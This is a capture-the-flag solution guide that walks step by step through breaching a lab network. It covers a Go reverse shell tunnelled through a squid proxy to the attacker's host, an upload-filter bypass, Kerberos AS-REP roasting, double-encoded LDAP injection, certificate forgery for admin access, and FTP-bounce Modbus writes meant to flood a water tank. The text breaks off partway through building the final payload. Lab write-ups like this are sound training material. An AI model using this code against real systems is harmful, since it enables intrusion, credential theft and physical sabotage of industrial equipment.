# DogHouse

*Solution Guide*

## Getting Started

Use the provided `kali` machine to access the CTF `web` and hack your way into the network from there.
The Kali credentials are `user:password`.

## Token 1
*Service requests on the CTF `web` page are downloaded and clicked on by `ubuntu1` behind the web proxy. The first token is in the `/tmp` directory on `ubuntu1`.*
*The `squid` proxy allows outbound traffic only on port `443` and `8443` over TLS.*
*`ubuntu1` scans uploads with an AV. Well-known payloads are deleted, proceed with caution.*

If we scan the network we will see a web server and a container called `squid`.
Let's browse to the web server.
We see three pages: Home, Meet the Team, and Service Request.

![web home page](imgs/01-web-home.png)
![web team page](imgs/02-web-team.png)
![web service request](imgs/03-web-servreq.png)

From the challenge description, we know we need to upload a service request to get a shell from behind the squid proxy.
Let's try to upload a simple text file.
If we try to upload something that isn't a PDF, we get denied.

![Failed Upload](imgs/04-uploadfail.png)

Let's see if we can bypass this PDF filter.
We can use `Burp Suite` to edit our requests in an attempt to upload a non-PDF file. 
Launch `Burp Suite`, accept the terms and conditions if prompted, start a temporary project, and navigate to the "Proxy" tab. 
With intercept on, navigate to the upload page with Burp's browser.
Let's try to upload our `test.txt` file again.
Intercept will hold the POST request after we hit submit, and from here we can edit our POST request before it is sent.
Let's change the `Content-Type` to `application/pdf`.

![Bypass](imgs/05-bypass-upload.png)

Now we can forward the POST request as well as the subsequent GET request.
After forwarding twice, we can go back to our browser and see that our bypass was successful.

![Successful Upload](imgs/06-upload-success.png)

Now that we know we can bypass the filter, we can upload a real payload.
We need a proxy-aware reverse shell that communicates over TLS.
Web proxies often require authentication, and it is common practice for clients to keep the Squid Proxy credentials in environment variables that look like one of these variants: 
`http_proxy=http://squiduser:squidpassword@squid:3128`
`https_proxy=http://squiduser:squidpassword@squid:3128`
`HTTP_PROXY=http://squiduser:squidpassword@squid:3128`
`HTTPS_PROXY=http://squiduser:squidpassword@squid:3128`

Port `3128` is a common port used for `squid` proxy.

As long as our victim has these environment variables set, then we don't need to know any of this authentication information.
So we can get these environment variables in our payload, authenticate to the proxy, and then send our TLS connection through to our `kali` machine.
For this example we will use `go` to craft our payload.
Be sure to set the `TARGET_IP` variable to your kali ip address.

```go
// tls_proxy_payload.go
package main

import (
        "crypto/tls"        // TLS client support
        "encoding/base64"   // For proxy Basic auth encoding
        "net"               // TCP networking
        "net/url"           // Proxy URL parsing
        "os"                // Environment variables + stdio
        "strings"           // String helpers
        "bufio"             // Buffered reading from proxy
        "fmt"               // Error printing
        "os/exec"           // Spawning a shell
)

// Target the proxy will CONNECT to
const (
        TARGET_IP   = "kali" //set to kali ip address
        TARGET_PORT = "443"
)

// getenvProxy looks for a proxy definition in common env vars.
// It returns the first one found, or empty string if none exist.
/* common web proxy env vars are:
    https_proxy=http://squiduser:squidpassword@squid:3128
    http_proxy=http://squiduser:squidpassword@squid:3128
    HTTPS_PROXY=http://squiduser:squidpassword@squid:3128
    HTTP_PROXY=http://squiduser:squidpassword@squid:3128
*/
func getenvProxy() string {
        for _, k := range []string{
                "HTTPS_PROXY",
                "https_proxy",
                "HTTP_PROXY",
                "http_proxy",
        } {
              if v := os.Getenv(k); v != "" {
                      return v
              }
        }
        return ""
}

func main() {
        // Read proxy from environment
        proxy := getenvProxy()

        // Ensure proxy has a scheme so url.Parse works
        if !strings.HasPrefix(proxy, "http://") &&
           !strings.HasPrefix(proxy, "https://") {
                proxy = "http://" + proxy
        }

        // Parse proxy URL
        u, _ := url.Parse(proxy)
        host := u.Hostname()
        port := u.Port()

        // Default Squid port if none specified
        if port == "" {
                port = "3128"
        }

        // Build Proxy-Authorization header if credentials exist
        auth := ""
        if u.User != nil {
              p, _ := u.User.Password()
              auth = base64.StdEncoding.EncodeToString(
                      []byte(u.User.Username() + ":" + p),
              )
        }

        // Open a raw TCP connection to the proxy
        conn, err := net.Dial("tcp", host+":"+port)
        if err != nil {
                return
        }

        // Construct HTTP CONNECT request
        req := "CONNECT " + TARGET_IP + ":" + TARGET_PORT + " HTTP/1.1\r\n"
        req += "Host: " +
                strings.TrimPrefix(
                        strings.Split(req, " ")[1],
                        "CONNECT ",
                ) + "\r\n"
        req += "Proxy-Connection: Keep-Alive\r\n"

        // Add proxy auth header
        if auth != "" {
                req += "Proxy-Authorization: Basic " + auth + "\r\n"
        }

        // End of HTTP headers
        req += "\r\n"

        // Send CONNECT request to proxy
        conn.Write([]byte(req))

        // Read proxy response headers until blank line
        br := bufio.NewReader(conn)
        for {
              l, _ := br.ReadString('\n')
              if strings.TrimSpace(l) == "" {
                      break
              }
        }

        // Wrap the established tunnel in TLS
        // InsecureSkipVerify disables cert validation
        tlsConn := tls.Client(conn, &tls.Config{
                InsecureSkipVerify: true,
        })

        // Perform TLS handshake over the CONNECT tunnel
        if err := tlsConn.Handshake(); err != nil {
                fmt.Fprintln(os.Stderr, "tls handshake:", err)
                return
        }

        // Spawn an interactive shell
        cmd := exec.Command("/bin/sh")

        // Bind shell I/O directly to the TLS connection
        cmd.Stdin  = tlsConn
        cmd.Stdout = tlsConn
        cmd.Stderr = tlsConn

        // Execute the shell
        cmd.Run()
}
```

Compile with: 

```bash
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o payload.elf tls_proxy_payload.go
```

Next we need to set up our listener.
First we will create our SSL certificate and key.
In this example, we will be going solely based off of IP address. Since we are in Docker and our container has a one-word hostname of `kali`, this can cause issues with certificate validation.

```bash
#replace <KALI IP> with the IP address of your kali machine
openssl req -x509 -newkey rsa:2048 -nodes -days 365 -keyout kali.key -out kali.pem -subj "/CN=<KALI IP>" -addext "subjectAltName=IP:<KALI IP>"
```

Next we will listen on port `443` with the `socat` `OPENSSL-LISTEN` command.
We will use `-d2` for debug level 2, so we can see when we receive a connection.

```bash
socat -d2 OPENSSL-LISTEN:443,cert=kali.pem,key=kali.key,verify=0,fork -
```

![Socat Listener](imgs/07-socatlisten.png)

Finally, we can upload our payload, using `Burp Suite` to bypass the PDF filter.

![Bypass filters](imgs/08-proxypayload-bypass.png)

![Success](imgs/09-proxy-upload-success.png)

After about 10 seconds, we should get a shell on our `socat` listener.
From here we can verify we are on `ubuntu1` and get the token.

```bash
cat /tmp/token1.txt
```

![Token1](imgs/10-token1.png)

`PCCC{token_on_ubuntu1}`

## Token 2
*Token 2: Exploit the `web-internal` web server to elevate your access rights. Advance deeper into the network to reach this server.*

Now that we are on `ubuntu1` we should try to improve our situational awareness.
If we scan our local network with we will see a new host called `ubuntu2`, however we don't see `web-internal`.
We can infer that we need to get on `ubuntu2` in order to access `web-internal`.
It appears `ubuntu2` is running `telnet`, but we don't have creds.
If we continue to survey `ubuntu1` we will find some interesting things.
We may have noticed a `tmux` artifact in the `/tmp` directory.
Running a `ps -elf` will also show us that a `tmux` session is running and a `telnet` session to `ubuntu2` is open. 
If the `telnet` session is running within `tmux`, then we could hijack the session by attaching to `tmux`.

![Process List](imgs/11-ps-tmux.png)

However, we need to upgrade our current shell if we want to attach.
There are various ways we can do this, but for now let's do the classic `python pty` and `stty raw` method.
First we run `python3 -c 'import pty;pty.spawn("/bin/bash")'`.
Then we background our shell with `ctrl+z`.
This has returned us to our normal Kali shell, where we run `stty raw -echo;fg`.
This will put us in a rather wonky shell on `ubuntu1`.
All we have to do now is run `export TERM=tmux-256color`.
Typically, one might set their `TERM` to something like `xterm` or `xterm-256color`, however `tmux` only accepts certain values for `TERM`.

```bash
#on ubuntu1
python3 -c 'import pty;pty.spawn("/bin/bash")'
<ctrl+z>

#on kali
stty raw -echo;fg

#on ubuntu1
export TERM=tmux-256color
```

![Shell upgrade](imgs/12-shell-upgrade.png)

We may find that our shell terminal size is rather small, we can fix this by getting our `stty` size on `kali`, and setting the same size on `ubuntu1`.

```bash
#on kali
stty size
#will print something like 42 141
#where 42 is the number of rows and 141 is the number of columns

#on ubuntu1
stty rows 42 cols 141 #set these values to your kali terminal size
```

Next we can attach to the existing `tmux` session.
If we attach we will land on `ubuntu2`.

```bash
tmux attach
```

We have successfully hijacked a `telnet` session.

![Attach to tmux](imgs/13-tmux-attach.png)

If we run `ip a`, we will see that we have an interface on a different subnet than `ubuntu1`.
If we scan this network we will see `web-internal` listening on port `8080` as well as various other containers like `kdc`, suggesting this is a `kerberos` network.
The `tmux` screen most likely won't allow mouse scrolling by default. If so, you can enable scrolling by hitting `ctrl+b` and then entering `:set -g mouse on`. 
Alternatively, it may be useful to save your `nmap` scan to a file and view it with something like `vim`.

Let's take a look at `web-internal`.
In order to browse to the internal site, we'll have to forward ports from `ubuntu2` to `web-internal` and tunnel our browser to the web server. We will use `chisel` and `socat` to do this.
We need to run `chisel` on `ubuntu1` and `socat` on `ubuntu2`.
`socat` is already installed on `ubuntu2`, however we will need to copy `chisel` over to `ubuntu1`.
Fortunately, the `squid proxy` allows two outbound ports: `443` and `8443`. We can host a simple `python https server` on `kali` and pull files down from `ubuntu1`.
We will use this python script:

```python
#!/usr/bin/env python3
#https-server.py
import http.server
import ssl

context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile='kali.pem', keyfile='kali.key')
httpd = http.server.HTTPServer(('0.0.0.0', 8443),http.server.SimpleHTTPRequestHandler)
httpd.socket = context.wrap_socket(httpd.socket,server_side=True)
httpd.serve_forever()
```

In a new terminal, copy the `https-server.py` script into the same directory that contains your `kali.pem` certificate we created earlier. Copy `chisel` and into the same directory as the server using `cp /usr/bin/socat /usr/bin/chisel ./`. Note we can determine the path with `which chisel`. 
Now, start the https python server on `kali`.

```bash
cp $(which chisel) ./
python3 https-server.py
```

Next we need to use `curl` to pull `chisel` down to `ubuntu1`. To run this command, we will need to temporarily exit the `tmux` session by pressing `ctrl+b` and then `d` for detach. You can then reattach with `tmux attach` again.

Now we can run `curl` on `ubuntu1`. Use the `-k` option to skip cert validation and be sure to replace `kali` with your `kali` IP address: 

```bash
#on ubuntu1
curl -k https://kali:8443/chisel -o /tmp/chisel #replace kali with IP
```

![Download chisel](imgs/14-download-chisel.png)

Now we can run `chisel` over TLS.
Start by running `chisel server` on `kali`. Note you will first need to stop your Python `HTTPS` server first if it is still running so we can use port `8443`.

```bash
#on kali
chisel server --port 8443 --tls-cert kali.pem --tls-key kali.key --reverse
```

Run the client on `ubuntu1`.
Tell chisel to use `squid` proxy and skip cert validation. We can find the proxy creds in `env`. Run the command in the background so we can still use the `ubuntu1` shell. Note that you can use `ctrl+b d` to switch back to `ubuntu1` while `ubuntu2` is running `socat` without interrupting it. Also, be sure to make `chisel` executable first.

```bash
#on ubuntu1
chmod +x /tmp/chisel
/tmp/chisel client --proxy http://squiduser:squidpassword@squid:3128 --tls-skip-verify https://kali:8443 R:socks 2>/dev/null & #replace kali with IP address
```

Now we should configure `chisel` modifying the file `/etc/proxychains4.conf` on our Kali machine.
Comment out the `socks4` line and make sure the bottom of the file looks like this with the line `socks5 127.0.0.1 1080`.

```bash
#on kali
sudo sed -i 's/socks4/#socks4/g' /etc/proxychains4.conf
sudo sed -i '$a\socks5 127.0.0.1 1080' /etc/proxychains4.conf
```

![proxychains4.conf](imgs/18-proxychains-conf.png)

```ini
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4  127.0.0.1 9050
socks5  127.0.0.1 1080
```

Now, open the Firefox browser and edit your proxy settings. The command `firefox "about:preferences#general-network"` should open the correct settings page with the `Network Settings` at the very bottom. Choose "Manual proxy configuration", set the "SOCKS HOST" to `127.0.0.1`, "PORT" to `1080`, and choose "SOCKS v5".

![firefox proxy settings](imgs/19-firefox-proxy.png)

Let's use `socat` to forward `ubuntu2` port `8080` to `web-internal.ctf.local` port `8080`: 

```bash
#on ubuntu2
socat TCP-LISTEN:8080,fork TCP-CONNECT:web-internal.ctf.local:8080 &
```

Now browse to `http://ubuntu2:8080`
We should get forwarded to `web-internal` where we are met with a login page.

![Login Page](imgs/20-employee-login.png)

We need to find a way to login and there are two methods that can work in this scenario.
We can either try to attack `kerberos` and get user credentials from there.
Or we can attempt to brute force with something like `hydra`.
The `kerberos` method is easier in this case, however both methods have the same first step.
We need to get a list of users that we could potentially log in with.
If we think back to the beginning of the challenge, we were given a list of names on the public facing web server.
Let's generate a text file that has a list of possible usernames based on what we saw on the web page.
We could make our own script, or we could borrow one from the internet. I used this one from GitHub: [https://github.com/w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username). 

First, use copy-paste to save the script into our `kali` instance. 
Now, start by making `names.txt`, a comma separated list of the first and last names from the website.
Be aware that this script doesn't do well with empty lines, so make sure your `names.txt` file doesn't have any blank lines in it.

```csv
bob,taylor
alice,jennings
joe,williams
eve,smith
ryan,jones
```

Then run the script and output to a file `users.txt` 

```bash
#on kali
python3 ADgenerator.py names.txt > users.txt
```

![Generate Usernames](imgs/21-names.png)

Now we go back to `ubuntu2` and set a port forward to point at `kdc.ctf.local` port `88`. Once in the `tmux` session, run the following command:

```bash
#on ubuntu2
socat TCP-LISTEN:88,fork TCP-CONNECT:kdc.ctf.local:88 &
```

Now we can try an `as-rep roasting` attack with `impacket`.
We specify the domain name of `ctf.local` (as the company is named `ctf`), we set `-dc-ip` to `ubuntu2`, and we specify `john` format so we can crack any resulting hashes with `john`.
We can also run this with `-q` and `grep -v Error` to remove a lot of unnecessary junk from the output.
With this attack, we were able to get the hash of user `jwilliams`. Copy and paste the hash into a file named `hash`, and then crack it with `john`.
The password is `qwerty`.

```bash
proxychains -q impacket-GetNPUsers ctf.local/ -dc-ip ubuntu2 -usersfile users.txt -format john | grep -v Error
```

```bash
vim hash # Or another editor of your choice
# $krb5asrep$18$CTF.LOCALjwilliams$d5607436ad22eb5d34822cca9c30b9e8282c2d1848d11d1443f72a153bc55122142dc8c39616c750f68646c70c936954d4f3d4f8a2d0d072f3cb7c88097253d0d968ae400fd760d4089cf2bc58a8446d6b38489a667ae1b49af29b5d94acd4f79ccfcccaa93dc4d7d52c5f76bc87b4ce89e04ee3bf20ad7ce70fc6de5db2050c9a6802f8e68455778ad43ad731022f6ccb71cc1b9dde5632b6d774e8ee708a90665a0f29116491ff997f840e3cda5f013b547a6329b80d79d5af96616bf53625dc7b61fa814397d5b82fd44cede3219d1bfdb28becf4fbee$31d2e371d2044da3dd8b498b
john hash
```

![as-rep roasting](imgs/22-impacket.png)

Browse to `web-internal` on Firefox, and login as `jwilliams` with password `qwerty`.
Once logged in we see two pages: `Helpdesk` and `Search`.

![Helpdesk](imgs/23-helpdesk.png)
![Employee Lookup](imgs/24-searchpage-1.png)

Helpdesk isn't of any significance.
Let's try out the employee lookup.
If we search for a user we can see that the site uses `ldap` for user lookup, and we are able to see the `ldap filter`.

![Ldap Filter](imgs/24-search-shows-filter.png)

It appears that the site searches only for users belonging to a specific `ldap` group.
If we enter a wildcard character then we can see every user in the group.

![Wildcard Search](imgs/25-search-wildcard.png)

It also appears that the `attr` field is vulnerable. If we set the `attr` field to something like `userPassword` (an `ldap` standard) we can get the passwords of every user.
We can try to crack these hashes, but we won't be able to (or at least it will take a very long time).

![userPassword](imgs/26-search-pass-attr.png)

The objective for this token is to "elevate our access", so let's see if we can break out of this `gidNumber` restriction and get the passwords for users in more privileged groups.
To break out of this `ldap` search, we want to inject something like this: `*))(uid=*)(|(cn=*` 
Making our full search string: `(|(&(uid=*))(uid=*)(|(cn=*)(gidNumber=1101)))`
This will match any `uid` or any `cn` and allow us to search every `ldap` group.
If we try to inject our payload, we aren't successful, and we get the resulting filter string: `(|(&(uid=*uid=*|cn=*)(gidNumber=1101)))`

![Failed Injection](imgs/27-search-strip.png)

It appears that our parenthesis are being stripped.
We can try a few things to bypass this sanitization.
We can try URL encoding, which doesn't seem to get us anywhere at first, however if we double encode our injection string then we are able to bypass the filter.
So our URL encoded string would look like this: `*%2529%2529%2528uid%253D*%2529%2528%257C%2528cn%253D*`. 

So this would be the full URL search: 

```bash
http://ubuntu2:8080/search?attr=uid&user=*%2529%2529%2528uid%253D*%2529%2528%257C%2528cn%253D*
```

![Double URL Encode](imgs/28-search-causer-show.png)

This allows us to list what seems to be three extra users: `causer` and two blank users. It appears that the developer has added additional checks to ensure admin account information doesn't show in the search.
If we set the `attr` field in the `URL` to `userPassword`, then we get the password for `causer` which happens to be the next token. 

The full URL is:

```bash
http://ubuntu2:8080/search?attr=userPassword&user=*%2529%2529%2528uid%253D*%2529%2528%257C%2528cn%253D*
```

![Token2](imgs/29-token2.png)

And the token is:

`PCCC{ldap_injection_passwd_token}`

Since the token is a password, be sure to store it somewhere as we will need it later.

## Token 3 
*Token 3: Take advantage of the `ca` and `kerberos pkinit` to escalate to `admin` privileges, and find the token on `client1`.*

Now that we have creds to the causer account, we want to elevate to admin by attacking the `ca`.
If we scan the `ca` we will see that it is listening on port `80`.
Let's again go back to `ubuntu2` and point `socat` at `ca` port `80`.

```bash
#on ubuntu2
socat TCP-LISTEN:80,fork TCP-CONNECT:ca.ctf.local:80 &
```

Browse to the `ca` in Firefox and we see a similar login page. We can log in with `causer` creds, where the password is Token 2.
We are redirected to a `Client Certificate Request Page`.
The site gives us the option to upload a CSR (Certificate Signing Request), which the `ca` will then sign and return to us.
Kerberos has an authentication mechanism called `pkinit` which can be configured to accept a signed `x509 cert` in return for a `TGT`.

The site explains that only certain groups are allowed to upload an extensions file along with their CSR.
If we upload an extensions file that applies the `admin` user as a `SAN (SubjectAlternateName)`, we can use the resulting cert to request Kerberos tickets as `admin`.
Referring to the MIT Kerberos docs, we can see clear examples of `pkinit` extension files: `https://web.mit.edu/kerberos/krb5-1.12/doc/admin/pkinit.html`
Ultimately, our extension file will look like this `extensions.conf` file:

```ini
[client_cert]
basicConstraints=CA:FALSE
keyUsage=digitalSignature,keyEncipherment,keyAgreement
extendedKeyUsage=1.3.6.1.5.2.3.4
subjectKeyIdentifier=hash
authorityKeyIdentifier=keyid,issuer
issuerAltName=issuer:copy
subjectAltName=otherName:1.3.6.1.5.2.2;SEQUENCE:princ_name

[princ_name]
realm=EXP:0,GeneralString:CTF.LOCAL
principal_name=EXP:1,SEQUENCE:principal_seq

[principal_seq]
name_type=EXP:0,INTEGER:1
name_string=EXP:1,SEQUENCE:principals

[principals]
princ1=GeneralString:admin
```

This is almost exactly the same as the file provided in the Kerberos docs, we just set the admin name for our principal and set realm to `CTF.LOCAL`.

After we create `extensions.conf`, we can generate a `clientkey.pem` and a `client.req` with `openssl`.
When creating the `client.req`, we can just leave the fields blank.

```bash
openssl genrsa -out clientkey.pem 2048
openssl req -new -key clientkey.pem -out client.req
```

![Generate Client Request](imgs/30-gen-client-req.png)

Now we upload `client.req` under "Step 1" and `extensions.conf` under "Step 2", and click "Request Sign".

![Sign Request](imgs/31-ca-upload.png)

Upon signing, we should automatically download a file called `cert.pem`.
Now that we have `cert.pem`, we need to request a ticket with the `kinit` command.
To do this, we need to transfer the certs over to `clinet1`, then `ssh` to `client1` as `causer`.
We will need to set up our proxy by pointing `socat` at `client1.ctf.local` port `22`.

```bash
socat TCP-LISTEN:22,fork TCP-CONNECT:client1.ctf.local:22 &
```

![Socat Port Forward to client1](imgs/32-socat-port-client1.png)

Next, use `scp` to transfer `cert.pem` and `clientkey.pem` to `client1`.

```bash
#on kali
proxychains -q scp ~/Downloads/cert.pem causer@ubuntu2:cert.pem
proxychains -q scp ./clientkey.pem causer@ubuntu2:clientkey.pem
```

![scp cert and key](imgs/33-scp-cert-key.png)

Now `ssh` to `ubuntu2` through `proxychains` using Token 2 as the password.

```bash
#on kali
proxychains -q ssh causer@ubuntu2
```

Our `ssh` session will be forwarded through `ubuntu2` to `client1`.

![ssh to client1](imgs/34-ssh-causer-client1.png)

Next we can request a Kerberos ticket using our `x509` cert with `kinit`.
We can run `klist` on `client1` to show that we received an admin ticket.
Then we can ssh to ourselves using `GSSAPIAuthentication` to authenticate with our Kerberos ticket.
Once authenticated we can run `ls` to see two files: `networkmap.jpg` and `token3.txt`.
We can look at the contents of `token3.txt` to get the third token.

```bash
#on client1
kinit -X X509_user_identity=FILE:cert.pem,clientkey.pem admin@CTF.LOCAL
klist
ssh -o GSSAPIAuthentication=yes admin@client1.ctf.local
```

Once authenticated we can run `ls` to see two files: `networkmap.jpg` and `token3.txt`.
We can look at the contents of `token3.txt` to get the third token.

```bash
#as admin
ls ~
cat ~/token3.txt 
```

![Authenticate as admin](imgs/35-pkinit-admin.png)

`PCCC{admin_client_token}`

## Token 4 
*Send Modbus data to the `plc` that controls the water tank in order to flood the server room.*
*Make sure you fill the water tank to maximum capacity before draining it.*
*The `plc` is listening on port `5020`.*

Let's pull down this `networkmap.jpg` file and look at it. An easy way to do this is to copy the `jpg` to `/tmp` and add read permissions for all users.
This way we can just `scp` the file down as `causer`.

```bash
# On client1
cp ./networkmap.jpg /tmp/networkmap.jpg
chmod +r /tmp/networkmap.jpg
```

```bash
# On Kali
proxychains -q scp causer@ubuntu2:/tmp/networkmap.jpg ./networkmap.jpg
xdg-open ./networkmap.jpg
```

If we open the file we will see credentials to `fileserver`.

![networkmap.jpg](imgs/36-netmap.png)

For the final token, we need to access the `plc`.
We are currently on `client1`, but we are still not on the same subnet as the `plc`, however we can reach the `hmi` and `fileserver`.
Looking at the network map, it's likely that the only way to reach the `plc` is through the `fileserver` or `hmi`.

Since we now have creds for the `fileserver`, let's start there.
Authenticate to the `fileserver` using the command `ftp fileserver`, the username `fileuser` and `gotheextrafile` as the password. 

Running `dir`, we see that there is a file called `TODO.txt`.
If we `get` the file with `get TODO.txt`, that will download it to `client1`. Using `bye` to exit the `fileserver`, we can read the file with `cat TODO.txt`

```bash
#on client1
ftp fileserver
#enter creds fileuser:gotheextrafile

#in ftp prompt
dir
get TODO.txt
bye

#on client1
cat TODO.txt
```

The file gives us a hint about the internal subnet IP range: `"By next week: Need to put the new firmware updates on the fileserver so the PLC on the 172.21.0.0-5 network can pull them."`

We can attempt to scan through the `fileserver` with an `nmap bounce scan`. 

```bash 
#on client1
nmap -Pn -p 5020 -b fileuser:gotheextrafile@fileserver 172.20.0.0-5 #replace ip range with addresses found in TODO.txt
```

An ftp bounce scan is an old technique and can have mixed results based on fileserver implementation, network connectivity, rate limits, etc.
If the above `nmap` scan fails to give us conclusive results it may be worth scanning each ip in the range one by one.

```bash
for i in {0..5};do nmap -Pn -p 5020 -b fileuser:gotheextrafile@fileserver 172.20.0.$i;done #replace ip range with addresses found in TODO.txt
```

Note that we know to limit to port `5020` as it is provided in the challenge description.
We see that the host at `.2` is listening on port `5020`, looks like we found our `plc`.

![access fileserver](imgs/37-1-ftp.png)
![nmap bounce scan](imgs/37-2-nmap-bounce.png)

Now we want to write `modbus` bytes to the plc registers, but we don't know what registers to write to yet or what values we need to write.
Let's shift focus to the `hmi` to see if we can get more information.
Of course, we will have to first point our `socat` forwarder to the `hmi` on port `8888`.

```bash
socat TCP-LISTEN:8888,fork TCP-CONNECT:hmi:8888 &
```

We can then browse to the `hmi` web page in Firefox with URL `http://ubuntu2:8888`.

![Water Tank Status](imgs/38-hmi-1.png)

It seems the site shows the live status of the water tank and shows multiple metrics like tank level, fill limit, valve state, pump state, and flood alert.
We still don't know the exact register numbers that control these states, but if we can send writes one at a time then we can determine what registers map to what function by observing the `hmi` feedback.

Since we can't send data directly to the water tank, we will have to send data through the `fileserver`.
This can be accomplished by using the `ftp PORT` command, which opens a TCP connection to a specified IP address. 
Once this connection is established, we can upload a file containing raw Modbus bytes and issue the `RETR` command. This will cause the `fileserver` to send the raw contents of our file through the TCP connection.

In summary, our flow is this: 
 - We create multiple binary files, each containing the raw bytes of a single Modbus write command. 
 - We upload the first binary file to the FTP server.
 - We issue the PORT command to the `plc`.
 - We issue the RETR command to send the Modbus write to the `plc`.
 - We monitor the `hmi` for changes.
 - We repeat this process until we have figured out which registers map to which `plc` functions.
 - Then we send payloads to fill the tank to 100%, and then drain the tank to flood the server room.

First we need to write a python script that will create the payloads.
Some background for our script:

Modbus write payloads take this format: `0001 0000 0006 01 06 0001 0001`.
The fields are as follows:
- `00 01`: Transaction ID - Used to identify which request a specific response belongs to. Typically, increments by 1 for every new request
- `00 00`: Protocol Identifier - Modbus TCP has a protocol ID of 0
- `00 06`: Length - Number of bytes following this one. In this case, it is 6 bytes: `01 06 00 01 00 01`
- `01`: Unit Identifier - Address of the device. Since there is only one device we are dealing with, this will always be 1
- `06`: Function Code - Specifies the Modbus operation. Function code `06` instructs the device to "Write Single Holding Register".
- `00 01`: Register Address - This is the register that will be written. We will increment this by 1 for each payload to write to a new address every time
- `00 01`: Data Value - Value to write to the specified register address

The important ones here are the Transaction ID, Register Address, and Data Value.
We are going to start Transaction ID and Register Address at zero, and leave the rest of the bytes as they are in the above byte string.
We are going to increment Transaction ID and Register Address by one for each payload, and save the result in a binary file.
The Data value will be kept at 1, so we will be writing a 1 to every register.
We'll start by making 30 payloads to test registers 0-29.
Use this script on `client1` to generate the payloads.

```python
#!/usr/bin/env python3
#build_payloads.py
import os

# Create directory if it doesn't exist
os.makedirs("payloads", exist_ok=True)

for c in range(30):
    raw_bytes = bytes([0x00, c, 0x00, 0x00, 0x00, 0x06, 0x01, 0x06, 0x00, c, 0x00, 0x01])
    with open(f"payloads/payload{c:02d}.bin", 'wb') as file:
        file.write(raw_bytes)
```

Note you should run this on `client1` as `admin`. Both `vim` and `nano` are available, so you can use either to directly copy-paste the Python script.

```bash
python3 build_payloads.py
ls payloads/
```

![Build Payloads](imgs/39-build-payloads.png)

If we wanted to send one of these payloads to the `plc` we would run the following commands:

```bash
ftp fileserver #authenticate to the fileserver
binary #switch to binary mode
put payload00.bin #upload file
quote PORT 172,20,0,2,19,156 #note the comma separation and port specification. Port commands use two values determined by this formula `port=(p1*256)+p2` i.e. `5020=(19*256)+156`
quote RETR payload.bin #send bytes
```

Now we need a script to send each of our payloads to the FTP server and port the payload through to the `plc` one at a time. Again, we want to run this on `client1` as `admin`, so use either `vim` or `nano` to directly copy-paste it there.
Be sure to change `PLC_IP` to whatever the address of your target `plc` is.
Then run the script with `python3 modbus_bounce.py`.

```python
#!/usr/bin/env python3
#modbus_bounce.py

import os, sys, time, socket
from ftplib import FTP
import itertools

# ----- CONFIG -----
FTP_HOST = "fileserver" 
FTP_PORT = 21
FTP_USER = "fileuser"
FTP_PASS = "gotheextrafile"

PLC_IP = "172.20.0.2"  #CHANGE THIS
PLC_PORT = 5020              

REMOTE_DIR = "/"             
LOCAL_PAYLOAD_DIR = "./payloads"   
SLEEP_AFTER_RETR = 3    
CMD_INTERVAL = 0.3
# -------------------

def compute_port_tuple(port):
    p1 = port // 256
    p2 = port % 256
    return p1, p2

def ftp_connect():
    from ftplib import FTP
    ftp = FTP()
    ftp.connect(FTP_HOST, FTP_PORT, timeout=10)
    ftp.login(FTP_USER, FTP_PASS)
    ftp.sendcmd("TYPE I")       # binary
    ftp.set_pasv(True)          
    if REMOTE_DIR and REMOTE_DIR != "/":
        ftp.cwd(REMOTE_DIR)
    return ftp

def port_cmd_for_plc(ftp, ip, port):
    """Send PORT a,b,c,d,p1,p2 to ftp server."""
    # convert ip to comma-separated octets
    octets = ip.split(".")
    if len(octets) != 4:
        raise ValueError("Invalid PLC IP")
    p1,p2 = compute_port_tuple(port)
    args = ",".join(octets + [str(p1), str(p2)])
    resp = ftp.sendcmd("PORT " + args)   # blocks until server replies
    return resp

def retr_from_server_to_plc(ftp, filename):
    resp150 = ftp.sendcmd("RETR " + filename)
    # Some servers reply "150 Opening ..." first.
    # Now block until the transfer completes (226/250).
    try:
        ftp.voidresp()  # waits for a 2xx final (226/250)
    except Exception as e:
        # Some servers send 226 immediately; voidresp still OK.
        raise
    return resp150

def upload_file(ftp, localpath, remotename=None):
    if remotename is None:
        remotename = os.path.basename(localpath)
    with open(localpath, "rb") as f:
        ftp.storbinary("STOR " + remotename, f)
    return remotename

def main():
    payload_files = sorted([os.path.join(LOCAL_PAYLOAD_DIR,f) for f in os.listdir(LOCAL_PAYLOAD_DIR) if os.path.isfile(os.path.join(LOCAL_PAYLOAD_DIR,f))])
    if not payload_files:
        print("No payload files in", LOCAL_PAYLOAD_DIR); sys.exit(1)

    ftp = ftp_connect()
    print("Connected to FTP", FTP_HOST)
    time.sleep(CMD_INTERVAL)
    try:
        for idx, payload in enumerate(payload_files):
            fname = os.path.basename(payload)
            print(f"\n=== Attempt {idx+1}: {fname} ===")

            # upload payload to FTP server
            print("Uploading", payload, "->", fname)
            upload_file(ftp, payload, remotename=fname)
            print("Uploaded.")
            try:
                print("Sending PORT ->", PLC_IP, ":", PLC_PORT)
                port_resp = port_cmd_for_plc(ftp, PLC_IP, PLC_PORT)
                print("PORT response:", port_resp)
            except Exception as e:
                print("PORT failed:", e)
                continue

            try:
                print("Issuing RETR (server will connect to PLC and stream file)...")
                resp150 = retr_from_server_to_plc(ftp, fname)
                print("RETR started:", resp150)         # "150 Opening ..."
                print("RETR completed (226 received).") # only reach here after voidresp()
            except Exception as e:
                print("RETR failed:", e)
            time.sleep(SLEEP_AFTER_RETR)
    finally:
        try:
            ftp.quit()
        except Exception:
            pass

if __name__ == "__main__":
    main()
```

If we run this script while looking at the `hmi`, we can see what register write caused a change in the water tank status.
We will notice the register 11 turned the pump on, until the tank reached its Fill Limit.
We also noticed that register 20 set the Fill Limit to 1%. This makes sense because we wrote a 1 to that register.
We saw that register 21 caused the valve to open and drain the tank.

![Pump at register 11](imgs/40-enum-pump.png)
![Fill Limit at register 20](imgs/41-enum-limit.png)
![Valve at register 21](imgs/42-enum-valve.png)

Now we have all we need to get the final token.
We need to first close the valve by writing a 0 to register 21: 

```bash
printf '\x00\x03\x00\x00\x00\x06\x01\x06\x00\x15\x00\x00' > fill_tank.bin
```

We need to then set the Fill Limit to 100% by writing a 100 (0x64) to register 20 (note the use `>>` of to append): 

```bash
printf '\x00\x01\x00\x00\x00\x06\x01\x06\x00\x14\x00\x64' >> fill_tank.bin
```

